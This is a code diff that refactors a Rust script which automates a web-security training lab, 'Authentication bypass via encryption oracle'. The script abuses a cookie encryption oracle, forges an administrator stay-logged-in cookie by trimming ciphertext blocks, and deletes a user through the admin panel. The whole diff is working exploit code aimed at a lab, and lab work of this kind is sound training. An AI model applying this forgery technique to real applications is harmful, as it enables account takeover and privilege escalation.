@@ -1,38 +1,32 @@
-/**********************************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 29/10/2023
+/*******************************************************************************
 *
 * Lab: Authentication bypass via encryption oracle
 *
-* Steps: 1. Fetch the login page
-*        2. Extract the csrf token and session cookie to login
-*        3. Login as wiener
-*        4. Extract the stay-logged-in cookie
-*        5. Fetch a post page with the stay-logged in cookie value in the notification 
-*           cookie to decrypt it
-*        6. Extract the decrypted value
-*        7. Extract the csrf token to post a comment
-*        8. Post a comment with <PADDING>administrator:<NUMBER> in the email field 
-*           ( where PADDING is 9 bytes and and NUMBER is extracted from the decrypted value 
-*           in the previous step )
-*        9. Extract the notification cookie
-*        10. Decode the notification cookie with base64
-*        11. Remove the first two blocks and encode the remaining blocks
-*        12. Place the last encoded value in the stay-logged-in cookie and delete carlos
+* Hack Steps: 
+*      1. Fetch the login page
+*      2. Extract the csrf token and session cookie to login
+*      3. Login as wiener
+*      4. Extract the stay-logged-in cookie
+*      5. Fetch a post page with the stay-logged in cookie value 
+*         in the notification cookie to decrypt it
+*      6. Extract the decrypted value
+*      7. Extract the csrf token to post a comment
+*      8. Post a comment with <PADDING>administrator:<NUMBER> 
+*         in the email field (where PADDING is 9 bytes and and NUMBER is 
+*         extracted from the decrypted value in the previous step )
+*      9. Extract the notification cookie
+*      10. Decode the notification cookie with base64
+*      11. Remove the first two blocks and encode the remaining blocks
+*      12. Place the last encoded value in the stay-logged-in cookie 
+*          and delete carlos
 *
-***********************************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+********************************************************************************/
 use base64::{engine::general_purpose::STANDARD, Engine};
-use percent_encoding::percent_decode;
+use lazy_static::lazy_static;
+use percent_encoding::{percent_decode, utf8_percent_encode, PercentEncode, NON_ALPHANUMERIC};
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use select::{document::Document, predicate::Attr};
@@ -43,212 +37,106 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a110062036a119f83e59db100b90060.web-security-academy.net";
+
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
+}
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0acc00a5031db148813bf7fc007e00be.web-security-academy.net";
+    print!("⦗1⦘ Fetching the login page.. ");
+    flush_terminal();
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
+    let login_page = fetch_login_page();
 
-    print!("{}", "⦗1⦘ Fetching the login page.. ".white());
-    io::stdout().flush();
+    println!("{}", "OK".green());
+    print!("⦗2⦘ Extracting the csrf token and session cookie to login.. ");
+    flush_terminal();
 
-    // fetch the login page
-    let login_page = client
-        .get(format!("{url}/login"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));
+    let mut session = get_cookie(&login_page, "session");
+    let mut csrf_token = get_csrf_token(login_page);
+
+    println!("{}", "OK".green());
+    print!("⦗3⦘ Logging in as wiener.. ");
+    flush_terminal();
+
+    let login = login_as_wiener(&session, &csrf_token);
+
+    println!("{}", "OK".green());
+    print!("⦗4⦘ Extracting the stay-logged-in cookie.. ",);
+    flush_terminal();
+
+    session = get_cookie_from_multiple_cookies(&login, "session");
+    let stay_logged_in = get_cookie_from_multiple_cookies(&login, "stay-logged-in");
 
     println!("{}", "OK".green());
     print!(
-        "{}",
-        "⦗2⦘ Extracting the csrf token and session cookie to login.. ".white(),
-    );
-    io::stdout().flush();
-
-    // extract session cookie
-    let mut session = extract_from_cookie(login_page.headers(), "session")
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    // extract the csrf token
-    let mut csrf =
-        extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
-    io::stdout().flush();
-
-    // login as wiener
-    let login = client
-        .post(format!("{url}/login"))
-        .header("Cookie", format!("session={session}"))
-        .form(&HashMap::from([
-            ("username", "wiener"),
-            ("password", "peter"),
-            ("stay-logged-in", "on"),
-            ("csrf", &csrf),
-        ]))
-        .send()
-        .expect(&format!("{}", "[!] Failed to login as wiener".red()));
-
-    println!("{}", "OK".green());
-    print!("{}", "⦗4⦘ Extracting the stay-logged-in cookie.. ".white(),);
-    io::stdout().flush();
-
-    // extract session cookie of wiener
-    session = extract_from_multiple_cookies(&login.headers(), "session")
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    // extract stay-logged-in cookie of wiener
-    let stay_logged_in = extract_from_multiple_cookies(&login.headers(), "stay-logged-in").expect(
-        &format!("{}", "[!] Failed to extract stay-logged-in cookie".red()),
-    );
-
-    println!("{}", "OK".green());
-    print!(
-        "{}",
         "⦗5⦘ Fetching a post page with the stay-logged in cookie value in the notification cookie to decrypt it.. "
-            .white(),
     );
-    io::stdout().flush();
+    flush_terminal();
 
-    // fetch a post page
-    let post_page = client
-        .get(format!("{url}/post?postId=1"))
-        .header(
-            "Cookie",
-            format!("notification={stay_logged_in}; session={session}"),
-        )
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch a post page".red()));
+    let post_page = fetch_post_page_with_cookies(&session, &stay_logged_in);
 
     println!("{}", "OK".green());
-    print!("{}", "⦗6⦘ Extracting the decrypted value.. ".white(),);
-    io::stdout().flush();
+    print!("⦗6⦘ Extracting the decrypted value.. ",);
+    flush_terminal();
 
-    // get the body of the response
     let body = post_page.text().unwrap();
-
-    // extract the decrypted value
-    let decrypted = capture_pattern(r"\s*(wiener:\w*)\s*</header>", &body).expect(&format!(
-        "{}",
-        "[!] Failed to extract the decrypted value".red()
-    ));
-
-    // get the numbers part
+    let decrypted = capture_pattern_from_text(r"\s*(wiener:\w*)\s*</header>", &body);
     let numbers_part = decrypted.split(":").nth(1).unwrap();
-
-    // concat the administrator with the numbers part and add 9 bytes padding
     let admin_numbers_padding = format!("123456789administrator:{numbers_part}");
 
     println!("{} => {}", "OK".green(), decrypted.yellow());
-    print!(
-        "{}",
-        "⦗7⦘ Extracting the csrf token to post a comment.. ".white(),
-    );
-    io::stdout().flush();
+    print!("{}", "⦗7⦘ Extracting the csrf token to post a comment.. ",);
+    flush_terminal();
 
-    // extract the csrf token to post a comment
-    csrf = capture_pattern("csrf.+value=\"(.+)\"", &body).expect(&format!(
-        "{}",
-        "[!] Failed to extract the csrf token to post a comment".red()
-    ));
+    csrf_token = capture_pattern_from_text("csrf.+value=\"(.+)\"", &body);
 
     println!("{}", "OK".green());
     print!(
-        "{} {} {}",
-        "⦗8⦘ Posting a comment with".white(),
+        "⦗8⦘ Posting a comment with {} in the email field..",
         admin_numbers_padding.yellow(),
-        "in the email field.. ".white()
     );
-    io::stdout().flush();
+    flush_terminal();
 
-    // post a comment
-    let post_comment = client
-        .post(format!("{url}/post/comment"))
-        .header("Cookie", format!("session={session}"))
-        .form(&HashMap::from([
-            ("postId", "1"),
-            ("comment", "not important"),
-            ("name", "hacker"),
-            ("email", &admin_numbers_padding),
-            ("csrf", &csrf),
-        ]))
-        .send()
-        .expect(&format!("{}", "[!] Failed to post a comment".red()));
+    let post_comment = post_comment(&admin_numbers_padding, &session, &csrf_token);
 
     println!("{}", "OK".green());
-    print!("{}", "⦗9⦘ Extracting the notification cookie.. ".white(),);
-    io::stdout().flush();
+    print!("⦗9⦘ Extracting the notification cookie.. ",);
+    flush_terminal();
 
-    // extract the notification cookie
-    let notification = extract_from_cookie(post_comment.headers(), "notification").expect(
-        &format!("{}", "[!] Failed to extract the notification value".red()),
-    );
+    let notification_cookie = get_cookie(&post_comment, "notification");
 
     println!("{}", "OK".green());
+    print!("⦗10⦘ Decoding the notification cookie with base64..",);
+    flush_terminal();
 
-    // URL decode the notification cookie
-    let notification_url_decoded = percent_decode(notification.as_bytes())
+    let notification_url_decoded = percent_decode(notification_cookie.as_bytes())
         .decode_utf8()
         .unwrap()
         .to_string();
-
-    // decode the URL decoded value with base64
     let decoded = STANDARD.decode(notification_url_decoded).unwrap();
 
-    println!(
-        "{} {}",
-        "⦗10⦘ Decoding the notification cookie with base64..".white(),
-        "OK".green()
-    );
+    println!("{}", "OK".green());
+    print!("⦗11⦘ Removing the first two blocks and encode the remaining blocks..");
+    flush_terminal();
 
-    // remove the first two block
     let first_two_blocks_removed = &decoded[32..];
+    let base64_encoded = STANDARD.encode(first_two_blocks_removed);
+    let percent_encoded = utf8_percent_encode(&base64_encoded, NON_ALPHANUMERIC);
 
-    // encode the remain blocks with base64
-    let encoded = STANDARD.encode(first_two_blocks_removed);
+    println!("{} => {}", "OK".green(), base64_encoded.yellow());
+    print!("⦗12⦘ Placing the last encoded value in the stay-logged-in cookie and delete carlos.. ");
+    flush_terminal();
 
-    println!(
-        "{} {} => {}",
-        "⦗11⦘ Removing the first two blocks and encode the remaining blocks..".white(),
-        "OK".green(),
-        encoded.yellow()
-    );
-
-    print!(
-        "{}",
-        "⦗12⦘ Placing the last encoded value in the stay-logged-in cookie and delete carlos.. "
-            .white(),
-    );
-    io::stdout().flush();
-
-    // delete carlos from the admin panel
-    client
-        .get(format!("{url}/admin/delete?username=carlos"))
-        .header("Cookie", format!("stay-logged-in={encoded}"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to delete carlos from the admin panel".red()
-        ));
+    delete_carlos(percent_encoded);
 
     println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as".white(),
-        "solved".green()
-    )
+    println!("🗹 The lab should be marked now as {}", "solved".green())
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -256,73 +144,107 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+fn fetch_login_page() -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}/login"))
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to fetch the login page".red()))
 }
 
-/*************************************************
-* Function to extract csrf from the response body
-**************************************************/
-fn extract_csrf(res: Response) -> Option<String> {
-    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
+fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("username", "wiener"),
+            ("password", "peter"),
+            ("stay-logged-in", "on"),
+            ("csrf", &csrf_token),
+        ]))
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
+}
+
+fn fetch_post_page_with_cookies(session: &str, stay_logged_in: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}/post?postId=1"))
+        .header(
+            "Cookie",
+            format!("notification={stay_logged_in}; session={session}"),
+        )
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to fetch a post page".red()))
+}
+
+fn post_comment(email: &str, session: &str, csrf_token: &str) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/post/comment"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("postId", "1"),
+            ("comment", "not important"),
+            ("name", "hacker"),
+            ("email", &email),
+            ("csrf", &csrf_token),
+        ]))
+        .send()
+        .expect(&format!("{}", "⦗!⦘ Failed to post a comment".red()))
+}
+
+fn delete_carlos(cookie: PercentEncode<'_>) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}/admin/delete?username=carlos"))
+        .header("Cookie", format!("stay-logged-in={cookie}"))
+        .send()
+        .expect(&format!(
+            "{}",
+            "⦗!⦘ Failed to delete carlos from the admin panel".red()
+        ))
+}
+
+fn get_csrf_token(response: Response) -> String {
+    let document = Document::from(response.text().unwrap().as_str());
+    document
         .find(Attr("name", "csrf"))
         .find_map(|f| f.attr("value"))
-    {
-        Some(csrf.to_string())
-    } else {
-        None
-    }
+        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
+        .to_string()
 }
 
-/*****************************************************
-* Function to extract values from the cookie header
-******************************************************/
-fn extract_from_cookie(headers: &HeaderMap, text: &str) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern(&format!("{text}=(.*);"), cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
+fn get_cookie(response: &Response, cookie: &str) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text(&format!("{cookie}=(.*);"), cookie_header)
 }
 
-/******************************************************
-* Function to extract values from multiple cookies
-*******************************************************/
-fn extract_from_multiple_cookies(headers: &HeaderMap, cookie_name: &str) -> Option<String> {
-    let mut cookie: Option<_> = None;
+fn get_cookie_from_multiple_cookies(response: &Response, cookie_name: &str) -> String {
+    let headers = response.headers();
 
     match cookie_name {
-        "session" => cookie = headers.get_all("set-cookie").iter().nth(1),
-        "stay-logged-in" => cookie = headers.get_all("set-cookie").iter().nth(0),
-        _ => (),
-    }
-
-    let text = cookie.unwrap().to_str().unwrap();
-
-    match cookie_name {
-        "session" => {
-            if let Some(session) = capture_pattern("session=(.*);", text) {
-                Some(session.as_str().to_string())
-            } else {
-                None
-            }
-        }
         "stay-logged-in" => {
-            if let Some(token) = capture_pattern("stay-logged-in=(.*);", text) {
-                Some(token.as_str().to_string())
-            } else {
-                None
-            }
+            let first_cookie = headers.get_all("set-cookie").iter().nth(0);
+            let first_cookie_as_string = first_cookie.unwrap().to_str().unwrap();
+            capture_pattern_from_text("stay-logged-in=(.*);", first_cookie_as_string)
         }
-        _ => None,
+        "session" => {
+            let second_cookie = headers.get_all("set-cookie").iter().nth(1);
+            let second_cookie_as_string = second_cookie.unwrap().to_str().unwrap();
+            capture_pattern_from_text("session=(.*);", second_cookie_as_string)
+        }
+        _ => "".to_string(),
     }
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
